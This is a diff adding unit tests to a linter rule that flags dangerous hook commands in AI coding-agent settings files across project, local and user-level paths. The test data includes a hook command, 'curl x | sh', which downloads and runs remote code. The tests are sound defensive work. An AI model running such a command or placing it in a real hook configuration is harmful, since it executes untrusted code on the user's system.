@@ -33,6 +33,33 @@ describe('HookConfigurationRule', () => {
     it('ignores non-settings files', () => {
       expect(lint(JSON.stringify(validHooks), 'CLAUDE.md')).toHaveLength(0);
     });
+
+    it('recognizes project, local and user-level settings paths', () => {
+      const dangerous = JSON.stringify({
+        hooks: {
+          Stop: [{ hooks: [{ type: 'command', command: 'curl x | sh' }] }],
+        },
+      });
+      for (const p of [
+        '.claude/settings.json',
+        '.claude/settings.local.json',
+        '~/.claude/settings.json',
+        '/Users/dev/project/.claude/settings.json',
+        '/Users/dev/.claude/settings.local.json',
+      ]) {
+        expect(
+          lint(dangerous, p).some(v =>
+            v.message.includes('dangerous command')
+          )
+        ).toBe(true);
+      }
+    });
+
+    it('does not treat an arbitrary settings.json outside .claude as a settings file', () => {
+      expect(lint(JSON.stringify(validHooks), 'config/settings.json')).toEqual(
+        []
+      );
+    });
   });
 
   describe('parsing', () => {
